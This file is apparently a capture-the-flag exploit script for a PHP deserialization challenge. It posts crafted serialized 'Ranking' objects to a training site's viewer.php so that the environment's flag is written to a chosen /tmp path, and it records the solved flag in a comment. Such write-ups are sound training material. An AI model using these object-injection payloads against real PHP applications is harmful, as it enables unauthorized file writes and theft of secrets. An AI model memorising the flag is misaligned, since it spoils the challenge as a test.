#!/usr/bin/env python3

# PHP serialization challenge
# Look to metactf.php for the malicious PHP serialized payload.

# flag{never_deserialize_user_input!}

import random
import string
import requests
import os


URL = "http://1024.training.jinblack.it"


def upload_replay(session, replay):
    url = "%s/viewer.php" % URL
    files = {"replay": replay}
    r = session.post(url, files=files)
    return r.text


def random_string():
    k = random.randint(6, 10)
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))


# this function can be used to run an external php file to generate serialized payload
def run_and_read_payload(file="./1024.php"):
    return os.popen("php %s" % file).read()


session = requests.Session()

malicious_replay = run_and_read_payload()
print(malicious_replay)
res = upload_replay(session, malicious_replay)
print(res)
exit()
# res = upload_replay(session, malicious_replay)
# print(res)

for i in range(8, 30):
    filename = "/tmp/%s.txt" % random_string()
    malicious_replay = 'O:7:"Ranking":3:{s:7:"ranking";s:%d:$_ENV["FLAG"];s:7:"changed";b:1;s:4:"path";s:%d:"%s";}' % (
        i, len(filename), filename)
    print(malicious_replay)
    res = upload_replay(session, malicious_replay)
    print(res)
    if "unserialize(): Error" not in res:
        print(res)
        print("Found at %d with filename %s" % (i, filename))
        exit()
